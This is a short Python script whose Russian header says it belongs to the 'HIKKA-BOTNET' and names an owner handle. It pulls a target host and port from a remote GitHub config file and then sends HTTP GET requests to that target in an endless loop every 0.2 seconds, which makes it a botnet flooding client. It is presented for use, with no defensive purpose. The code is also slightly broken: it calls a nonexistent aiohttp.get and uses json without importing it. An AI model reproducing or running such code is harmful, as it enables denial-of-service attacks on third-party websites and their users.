#[+]==============[ INFO ]===========[+]#
"""данный код написан для системы
HIKKA-BOTNET, если вы участвуете в 
системе ботнет, напишите овнеру."""
# @hotdrify <-- OWNER
#[+]=================================[+]#
import time
import asyncio
import aiohttp

async def get(ip, port):
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.get(f"http://{ip}:{port}") as response:
                await response.read()
            await asyncio.sleep(0.2)

async def main():
    cfg = await aiohttp.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
    config = json.loads(await cfg.text())

    ip = config["site"]
    port = config["port"]
    type = config["type"]

    if type == "GET":
        await get(ip, port)